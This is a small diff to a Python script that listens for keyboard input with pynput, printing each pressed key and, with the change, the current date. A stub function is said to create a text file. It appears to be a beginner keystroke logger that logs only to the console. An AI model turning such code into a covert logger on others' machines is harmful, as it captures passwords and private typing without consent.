@@ -1,5 +1,7 @@
 from pynput.keyboard import Key, Listener
+from datetime import date, time
 
+today =  date.today()
 
 #this function creates a txt file
 def create_txt():
@@ -7,6 +9,7 @@ def create_txt():
 
 #this function prints the pressed key
 def on_press(key):
+   print(f'{today}', end = ": ")
    print(key)
 
 while True:
